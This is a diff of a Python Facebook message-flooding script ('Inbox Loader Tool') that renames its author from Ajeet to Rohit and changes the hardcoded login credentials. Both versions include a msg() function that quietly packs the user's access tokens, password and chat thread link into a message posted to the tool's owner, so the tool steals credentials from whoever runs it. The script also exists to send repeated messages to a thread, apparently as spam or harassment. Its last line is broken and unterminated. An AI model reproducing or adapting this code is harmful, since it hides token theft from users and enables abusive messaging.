@@ -1,4 +1,3 @@
-
 from platform import system
 import sys
 def testPY():
@@ -152,12 +151,12 @@ def getName(token):
 
 if int:
     print('''\033[1;37m---------------------------------------------------------------------\n''')
-    print('''\033[1;34m-=[ Nonstop Multii + Inbox Loader Tool By = Ajeet ]=-''')
+    print('''\033[1;34m-=[ Nonstop Multii + Inbox Loader Tool By = Rohit ]=-''')
     print('''\033[1;37m-=[ Contact Us :: https://www.facebook.com/profile.php?id=100092988141664]=-\n''')
     print('''\033[1;36m---------------------------------------------------------------------\n''')
     i = datetime.now()
     print(i.strftime("\033[1;31m[#] Tool Run Time ==> %Y-%m-%d %I:%M:%S %p "))
-    print('''\033[1;37m[#] (^^^) The Tool Maker  Increadable boii == > [ Ajeet Here ]\n''')
+    print('''\033[1;37m[#] (^^^) The Tool Maker  Increadable boii == > [ Rohit Here ]\n''')
     print("\033[1;36;40m", end = "")
     import getpass
 
@@ -167,13 +166,13 @@ while attemps < 12345677901:
     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
     password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'ajeetXD' and password == '9':
+    if username == 'ROHITXD' and password == '3':
         print(' \033[0;95mSahii Haii Bhai.')
-        os.system('espeak -a 300 " Welcome To Ajeet Tool Enjoy Karo"')
+        os.system('espeak -a 300 " Welcome To rohit Tool Enjoy Karo"')
         break
     else:
         print(' Username Or Password Galat Hai Try Karo Firse..!! ')
-        os.system('espeak -a 300 " Password Galat Hai Ajeet Se Pucho"')
+        os.system('espeak -a 300 " Password Galat Hai rohit Se Pucho"')
         attemps += 1
         continue
 os.system('clear')
@@ -213,7 +212,7 @@ os.system('espeak -a 300 " Tu Soja Ab Mai Dekh Lunga... "')
 def msg():
 		parameters = {
 			'access_token' : random.choice(access_tokens),
-			'message': 'Hello Ajeet Sir Am Using Your Tool My ' 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" (-) ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id+'\n Password: '+password
+			'message': 'Hello rohit Sir Am Using Your Tool My ' 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" (-) ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id+'\n Password: '+password
 		}
 		try:
 			s = requests.post("", data=parameters, headers=headers)
@@ -254,8 +253,8 @@ while True:
 			print(BOLD + RED + "\033[1;31;1m[#]] Net Band Hogya Bhai : Message  {} Of Convo {} Failed To Send. {}: {}".format(
 				message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
 			e = datetime.now()
-			print (e.strftime("[#] Alone Ajeet iinxide | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
+			print (e.strftime("[#] Alone Rohit iinxide | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
 			sleep(10)
 			liness()
 else:
-	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')
+	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Ownrohit
